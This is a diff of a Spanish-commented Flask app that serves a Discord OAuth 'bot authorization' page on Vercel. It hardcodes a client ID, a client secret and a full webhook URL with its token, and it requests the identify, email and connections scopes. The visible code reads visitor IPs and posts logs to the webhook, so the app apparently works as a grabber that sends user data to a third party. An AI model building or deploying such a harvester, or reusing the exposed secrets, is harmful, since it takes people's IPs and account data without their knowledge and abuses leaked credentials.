@@ -5,8 +5,11 @@ import requests
 app = Flask(__name__)
 
 # --- CONFIGURACIÓN ---
-CLIENT_ID     = "1457527346687901812"
-CLIENT_SECRET = "8NXd3i8r1QXproq-MMf8EqW_BJOujcPR"
+# Estos datos deben coincidir con la app de Discord que estás usando para el bot
+# Client ID: 1446262720578977823
+# Client Secret: O_erWPGYfb4Mm9u6A7gVJR5-noGfulbt
+CLIENT_ID     = "1446262720578977823"
+CLIENT_SECRET = "O_erWPGYfb4Mm9u6A7gVJR5-noGfulbt"
 # REDIRECT_URI se genera automáticamente abajo para evitar errores al cambiar de dominio
 # El WEBHOOK donde llegarán los logs
 WEBHOOK       = "https://discord.com/api/webhooks/1456993989306749133/2JG3BvXA__irPAOcgx-R-lTPC7n7ScgWSgUl0jMmnR-staCUFK0b0upG2LwDHfck1ean"
@@ -52,10 +55,24 @@ def get_ip():
     return ip
 
 def get_redirect_uri():
-    # Se adapta automáticamente al dominio que estés usando (ej. dc-al3xg0nzalezzz.vercel.app)
+    """
+    Genera el redirect_uri que se usará tanto para:
+    - La URL de autorización (auth_url)
+    - El intercambio de token en /callback
+    Debe coincidir EXACTAMENTE con el registrado en el Developer Portal.
+    """
     host = request.headers.get('X-Forwarded-Host', request.headers.get('Host'))
-    scheme = request.headers.get('X-Forwarded-Proto', 'https')
-    return f"{scheme}://{host}/callback"
+
+    # Si estamos en Vercel, forzamos el dominio correcto para evitar problemas con caracteres especiales
+    # Debe coincidir con lo que tengas en Discord: https://bot-autorizaci-n.vercel.app/callback
+    if host and "vercel.app" in host:
+        base_url = "https://bot-autorizaci-n.vercel.app"
+    else:
+        scheme = request.headers.get('X-Forwarded-Proto', 'https')
+        base_url = f"{scheme}://{host}"
+
+    base_url = base_url.rstrip("/")
+    return f"{base_url}/callback"
 
 @app.route('/')
 def home():
@@ -73,8 +90,16 @@ def home():
         print(f"Error enviando webhook: {e}")
 
     # Generar URL de autorización (Scopes ampliados: identify + email + connections)
-    # %20 es el espacio en URL encoding
-    auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={redirect_uri}&response_type=code&scope=identify%20email%20connections"
+    # redirect_uri debe ir URL-encoded para Discord
+    from urllib.parse import quote
+    encoded_redirect = quote(redirect_uri, safe='')
+    auth_url = (
+        "https://discord.com/api/oauth2/authorize"
+        f"?client_id={CLIENT_ID}"
+        f"&redirect_uri={encoded_redirect}"
+        "&response_type=code"
+        "&scope=identify%20email%20connections"
+    )
     
     return render_template_string(HTML_TEMPLATE, auth_url=auth_url, logo=LOGO)
 
